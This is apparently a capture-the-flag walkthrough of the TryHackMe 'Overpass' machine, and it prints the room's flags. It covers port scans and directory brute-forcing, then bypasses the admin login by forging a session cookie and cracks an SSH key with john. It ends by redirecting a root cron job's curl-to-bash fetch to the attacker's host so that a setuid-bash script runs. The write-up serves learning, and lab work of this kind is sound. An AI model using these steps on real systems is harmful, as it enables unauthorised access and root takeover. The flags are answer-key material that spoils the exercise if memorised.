Walkthrough about Overpass1

Oct 13, 2021
---------------------------------------------

Hack the machine and get the flag in user.txt
thm{65c1aaf000506e56996822c6281e6bf7}


Escalate your privileges and get the flag in root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}

---------------------------------------------

First we did rustscan and we discover 2 ports that are open

Open 10.10.154.234:22
Open 10.10.154.234:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-13 11:51 PST
Initiating Ping Scan at 11:51
Scanning 10.10.154.234 [2 ports]
Completed Ping Scan at 11:51, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:51
Completed Parallel DNS resolution of 1 host. at 11:51, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:51
Scanning 10.10.154.234 [2 ports]
Discovered open port 22/tcp on 10.10.154.234
Discovered open port 80/tcp on 10.10.154.234
Completed Connect Scan at 11:51, 0.27s elapsed (2 total ports)
Nmap scan report for 10.10.154.234
Host is up, received syn-ack (0.27s latency).
Scanned at 2021-10-13 11:51:48 PST for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds


-----------------------------------------------

Then we did use feroxbuster to find some hidden directories in the site.
301        0l        0w        0c http://10.10.203.16/img
301        0l        0w        0c http://10.10.203.16/index.html
301        0l        0w        0c http://10.10.203.16/downloads
301        0l        0w        0c http://10.10.203.16/img/index.html
301        0l        0w        0c http://10.10.203.16/aboutus
301        0l        0w        0c http://10.10.203.16/downloads/index.html
301        0l        0w        0c http://10.10.203.16/aboutus/index.html
301        2l        3w       42c http://10.10.203.16/admin
200       40l       93w     1525c http://10.10.203.16/admin.html
301        0l        0w        0c http://10.10.203.16/admin/index.html

------------------------------------------------

Go navigate the website with the IP Add and port 80 which is http,
Then we did find and downloaded some files.

overpass.go
overpassLinux          ## which is executable
buildscript.sh

------------------------------------------------

We did go to the /admin directory and find some information,
Then it requires some username and passwords.

After a few try, we did some navigation through the source page,
Then found the login.js, which has the code that we can exploit.

"""
if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
"""

Then we just use the console to set some cookies.
Cookies.set("SessionToken","anything")

-------------------------------------------------

After that we refreshed the page and get some id_rsa

"""
Since you keep forgetting your password, James, I've set up SSH keys for you.
"""

We can assume the James is the username and we need passkey for ssh connection.

-------------------------------------------------

That's where the ssh2john comes 

"""
❯ python /usr/share/john/ssh2john.py id_rsa > forjohn.txt
"""

We did use ssh2john since the id_rsa is not passkey so we can to convert it,
Then we used john for some decryption.

"""
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
"""

Username: James
Password: james13

-------------------------------------------------

We did ssh in and did some linpeas.sh
Then we discover the root is using curl to get some script and using it into bash.
And we did also discover that we can modify the /etc/hosts 

-------------------------------------------------

Then we did modify the file IP Address to our tun0,
Then we make some directories and build the script

"""
#!/bin/bash

chmod +s /bin/bash
"""

-------------------------------------------------

And we did wait for the machine to make some set UID to the /bin/bash file
Then we just /bin/bash -p to get the privilege escalation.